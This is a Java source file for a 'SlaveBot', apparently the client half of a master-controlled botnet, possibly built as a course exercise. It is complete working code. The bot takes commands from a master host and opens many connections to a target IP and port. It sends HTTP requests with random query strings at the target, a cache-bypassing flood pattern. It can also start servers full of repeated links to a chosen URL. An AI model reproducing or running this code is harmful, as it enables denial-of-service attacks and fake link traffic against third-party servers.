import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import com.sun.net.httpserver.Headers;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

public class SlaveBot extends Thread {
	private int port;
	private String ip;
	private boolean running = false;
	private Map<String, List<Socket>> remoteConnectionMap = new HashMap<String, List<Socket>>();
	private Map<String, JavaHttpServer> fakeServers = new HashMap<>();

	public SlaveBot() {
	}

	public SlaveBot(int port, String ip) {
		this.port = port;
		this.ip = ip;
	}

	public static void main(String[] args) throws IOException {

		int port = 9999;
		String Master = "";
		String[] array1 = new String[4];

		if (args.length == 0) {
			BufferedReader i = new BufferedReader(new InputStreamReader(System.in));
			String datain = i.readLine();
			array1 = datain.split("\\s+");
			Master = array1[1];
			port = Integer.parseInt(array1[3]);
		} else if ((args.length == 4) || (args[0].equals("-h") && args[2].equals("-p"))) {
			Master = args[1];
			port = Integer.parseInt(args[3]);
		}

		BufferedReader in = new BufferedReader(new InputStreamReader(System.in));

		SlaveBot slaveConnection = new SlaveBot(port, Master);
		slaveConnection.running = true;
		slaveConnection.start();
		while (slaveConnection.running) {
			try {
				Thread.sleep(100);
			} catch (InterruptedException e) {
				System.out.println("Interrupted Thread");
				;
			}
		}
	}

	public void run() {
		try (Socket socket = new Socket(ip, port)) {
			String myAddress = socket.getLocalSocketAddress().toString();
			System.out.println("Slave: " + socket.getLocalSocketAddress() + " connected to Master: "
					+ socket.getRemoteSocketAddress());
			DataInputStream dis = new DataInputStream(socket.getInputStream());
			DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
			String command = null;
			String urldata = "";
			
			while ((command = dis.readUTF()) != null) {

				
				if ("exit".equals(command)) {
					running = false;
					break;
				} else if (command.startsWith("rise-fake-url")||command.startsWith("Rise-Fake-Url")) {

					// command --- rise-fake-url portNumber url
					// reference:
					// https://docs.oracle.com/javase/8/docs/jre/api/net/httpserver/spec/com/sun/net/httpserver/HttpServer.html

					
					String ip1 = ip;
					
					String[] array = command.split("\\s+");
					int port = Integer.parseInt(array[1]);
					String url = array[2];
					
					// to remove https:// and http:// from the url.
					if(url.startsWith("https://")){
						int length = url.length();
						url = url.substring(8, length);
						System.out.println(url);
					}else if(url.startsWith("http://")){
						int length = url.length();
						url = url.substring(7,length);
						System.out.println(url);
					}

					JavaHttpServer js = new JavaHttpServer(ip, port, url, dos);
					js.initiateServer(dos);
					js.startServer();
					fakeServers.put(ip1, js);

				} else if (command.startsWith("down-fake-url")) {
					// command  --- down-fake-url portNumber url:

					String ip1 = ip;
					String[] array = command.split("\\s+");
					int port = Integer.parseInt(array[1]);
					String url = array[2];
					
					dos.writeUTF("The Web Server " + ip + ":" + port + " is down");
					dos.writeUTF(">");
					
					
					
					JavaHttpServer js = fakeServers.get(ip1);
					//to check if a server was started or not
					// then stopping it
					if (js != null) {
						js.stopServer();
					}else
					{
						System.out.println("No active servers available to stop!!");
					}

				} else {
					String[] cmdArray = command.split("\\s+");
					String cmd = cmdArray[0];
					String slaveHostIp = cmdArray[1];
					if (!myAddress.equals(slaveHostIp) && (!"all".equalsIgnoreCase(slaveHostIp))) {
						continue;
					}
					String trgtHostIp = cmdArray[2];
					String trgtPort = null;
					int trgtPortNo = 0;
					if (cmdArray.length > 3) {
						try {
							trgtPort = cmdArray[3];
							trgtPortNo = Integer.parseInt(trgtPort);
						} catch (Exception e) {
							trgtPort = "all";
						}
					}
					if (cmdArray.length == 3) {
						trgtPort = "all";
					}
					boolean allConnections = "all".equalsIgnoreCase(trgtPort);
					if ("connect".equalsIgnoreCase(cmd)) {
						int noOfConnections = 1;
						boolean keepalive = false;
						boolean urlpresent = false;

						if (cmdArray.length > 4) {

							if ((!cmdArray[4].equalsIgnoreCase("keepalive")) && (!cmdArray[4].equalsIgnoreCase("url="))
									&& (!cmdArray[4].equalsIgnoreCase("url"))
									&& (!cmdArray[4].equalsIgnoreCase("url=/#q="))) {

								String noOfConnection = cmdArray[4];
								// System.out.println(noOfConnection);
								try {
									noOfConnections = Integer.parseInt(noOfConnection);
								} catch (Exception e) {
									System.out.println("Please enter an integer value for number of connections");
								}

							} else if (cmdArray[4].equalsIgnoreCase("keepalive")) {

								socket.setKeepAlive(true);
								keepalive = true;

							} else if ((cmdArray[4].equalsIgnoreCase("url=")) || (cmdArray[4].equalsIgnoreCase("url"))
									|| (cmdArray[4].equalsIgnoreCase("url=/#q="))) {

								urlpresent = true;
								if (trgtPortNo == 80) {
									urldata = "http://" + trgtHostIp + "/#q=";
								} else if (trgtPortNo == 443) {
									urldata = "https://" + trgtHostIp + "/#q=";
								} else {
									System.out.println("wrong protocol");
								}

							}

							if (cmdArray.length > 5) {

								if (cmdArray[5].equalsIgnoreCase("keepalive")) {

									socket.setKeepAlive(true);
									keepalive = true;

								} else if ((cmdArray[5].equalsIgnoreCase("url=")) || (cmdArray[5].contains("url"))
										|| (cmdArray[5].equalsIgnoreCase("url=/#q="))) {

									urlpresent = true;
									if (trgtPortNo == 80) {
										urldata = "http://" + trgtHostIp + "/#q=";
									} else if (trgtPortNo == 443) {
										urldata = "https://" + trgtHostIp + "/#q=";
									} else {
										System.out.println("wrong protocol");
									}

								}

							}

						}

						initiateRemoteHostConnection(socket, trgtHostIp, trgtPortNo, noOfConnections, dos, keepalive,
								urldata, urlpresent);
					} else if ("disconnect".equalsIgnoreCase(cmd)) {
						disconnectRemoteHostConnection(socket, trgtHostIp, trgtPortNo, allConnections, dos);
					} else {

						System.out.println("Unknown Command");
						dos.writeUTF("Unknown Command");
					}
				}
			}
		} catch (Exception e) {
		}
	}

	public void initiateRemoteHostConnection(Socket slaveSocket, String remoteIp, int port, int numOfConnections,
			DataOutputStream dos, boolean keepalive, String urldata, boolean urlpresent) throws IOException {
		List<Socket> connectionList = new ArrayList<Socket>();
		// System.out.println(remoteIp + ":" + port + " -> " +
		// numOfConnections);
		for (int i = 0; i < numOfConnections; i++) {
			Socket target = new Socket();
			target.connect(new InetSocketAddress(remoteIp, port));
			if (target.isConnected()) {
				dos.writeUTF("Slave: " + slaveSocket.toString() + " connected to the target: " + target.toString());
				if (keepalive) {
					dos.writeUTF("keepalive = true");
					// System.out.println("keepalive = true");
				} else if (urlpresent == true) {
					String o = urldata + SlaveBot.randomStringGenertor();

					URL url = new URL(o);
					HttpURLConnection webserverConn = (HttpURLConnection) url.openConnection();
					BufferedReader input = new BufferedReader(new InputStreamReader(webserverConn.getInputStream()));
					String line;

					// to clean up the files received from the server
					while ((line = input.readLine()) != null)
						;
					// System.out.println(line); to check the data from the
					// server.
					// System.out.println("Files from the server is discarded");

					dos.writeUTF(url + "");

					input.close();

					// System.out.println("Disconnected " + o + "
					// automatically.");

				}
			}
			connectionList.add(target);
			remoteConnectionMap.put(remoteIp, connectionList);
		}

		keepalive = false;
		urlpresent = false;
		// dos.writeUTF(">");
		try {
			dos.writeUTF(">");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void disconnectRemoteHostConnection(Socket slaveSocket, String remoteIp, int port, boolean allConnections,
			DataOutputStream dos) {
		List<Socket> connections = remoteConnectionMap.get(remoteIp);
		for (Socket trgtSocket : connections) {
			if (allConnections) {
				if (!trgtSocket.isClosed()) {
					try {
						trgtSocket.close();
						dos.writeUTF("Slave: " + slaveSocket.toString() + " disconnecting " + trgtSocket.toString());
					} catch (IOException e) {
						System.out.println("-1");
					}
				}
			} else {
				if (trgtSocket.getLocalPort() == port && (!trgtSocket.isClosed() || trgtSocket.isConnected())) {
					// System.out.println(trgtSocket.toString() + " is
					// disconnected");
					try {
						trgtSocket.close();
						dos.writeUTF(trgtSocket.toString() + " is disconnected");
					} catch (IOException e) {
						System.out.println("-1");
					}
				}
			}
		}
		try {
			dos.writeUTF(">");
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	/// To Generate the Random string

	private static String randomStringGenertor() {
		String RandomData = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"; // Alphabets,Numbers
		Random r = new Random();
		StringBuilder q = new StringBuilder();
		int up = r.nextInt(10) + 1;
		// System.out.println("up=" + up);
		for (int i = 1; i <= up; i++) {
			int index = r.nextInt(RandomData.length());
			q.append(RandomData.charAt(index));
		}
		String randomStr = q.toString();
		return (randomStr);

	}

	// -----------******* HttpServer Starts here *******---------//

	public class JavaHttpServer {

		private int socketNumber;
		private String url, ip;
		HttpServer httpServer;
		DataOutputStream dos;

		public JavaHttpServer(String ip, int socketNumber, String url, DataOutputStream dos) {
			setSocketNumber(socketNumber);
			setUrl(url);
			setIp(ip);
			this.dos = dos;

		}

		public void initiateServer(DataOutputStream dos) {
			
			try {
				httpServer = HttpServer.create(new InetSocketAddress(getSocketNumber()), 0);
				dos.writeUTF("The Web Server " + ip + ":" + socketNumber + " is started.");
				dos.writeUTF(">");
			} catch (IOException e) {

				System.out.println("The server to be created " + ip + ":"+ socketNumber + " is already in use by another SlaveBot");
			}
		}

		static final int responseCode_OK = 200;

		public void startServer() {

			httpServer.createContext("/", new HttpHandlers(getSocketNumber(), getIp()));
			httpServer.createContext("/index1.html", new GetHttpHandler1(getUrl()));
			httpServer.createContext("/index2.html", new GetHttpHandler2(getUrl()));
			httpServer.setExecutor(null);
			httpServer.start();
			

		}

		public void stopServer() {

			httpServer.stop(0);

		}

		public int getSocketNumber() {
			return socketNumber;
		}

		public void setSocketNumber(int socketNumber) {
			this.socketNumber = socketNumber;
		}

		public String getUrl() {
			return url;
		}

		public void setUrl(String url) {
			this.url = url;
		}

		public String getIp() {
			return ip;
		}

		public void setIp(String ip) {
			this.ip = ip;
		}

		class HttpHandlers implements HttpHandler {

			private int socketNumber;
			private String ip;

			public HttpHandlers(int socketNumber, String ip) {
				this.socketNumber = socketNumber;
				this.ip = ip;
			}

			@Override
			public void handle(HttpExchange he) throws IOException {

				String response = "<html><h2  align = \" center \" color = \" Blue \">WEB SERVER</h2><a href = ";
				
				response += "http://" + this.ip + ":" + this.socketNumber + "/index1.html";
				response += ">Check this out 1</a></html>";
				response += "<p>      </p>";
				response += "<a href=";
				response += "http://" + this.ip + ":" + this.socketNumber + "/index2.html";
				response += ">Check this out 2</a></html>";
				he.sendResponseHeaders(responseCode_OK, response.length());

				OutputStream outputStream = he.getResponseBody();
				outputStream.write(response.getBytes());
				outputStream.close();
			}
		}

		class GetHttpHandler1 implements HttpHandler {

			String url;

			public GetHttpHandler1(String url) {
				this.url = url;
			}

			@Override
			public void handle(HttpExchange he) throws IOException {

				Headers headers = he.getResponseHeaders();
				headers.add("Content-Type", "text/html");

				String out = "<html>";
				out += "<h2 align = \" center \"> Links for " + url + " </h2>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://" + this.url + "\"> Check this out! </a>";
				out += "<p> </p>";

				out += "</html>";

				byte[] bytes = out.getBytes();
				he.sendResponseHeaders(responseCode_OK, out.length());
				OutputStream outputStream = he.getResponseBody();
				outputStream.write(bytes, 0, bytes.length);
				outputStream.close();

			}

		}

		class GetHttpHandler2 implements HttpHandler {

			String url;

			public GetHttpHandler2(String url) {
				this.url = url;
			}

			@Override
			public void handle(HttpExchange he) throws IOException {

				Headers headers = he.getResponseHeaders();
				headers.add("Content-Type", "text/html");

				String out = "<html>";
				out += "<h2 align = \" center \"> Links for " + url + " </h2>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out +="\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";
				out += "<a href =";
				out += "\"https://"+ this.url + "\"> Check this out! </a>";
				out += "<p> </p>";

				out += "</html>";

				byte[] bytes = out.getBytes();
				he.sendResponseHeaders(responseCode_OK, out.length());
				OutputStream outputStream = he.getResponseBody();
				outputStream.write(bytes, 0, bytes.length);
				outputStream.close();

			}

		}

	}

	// -----------******** Stops Here **********-----------//
}

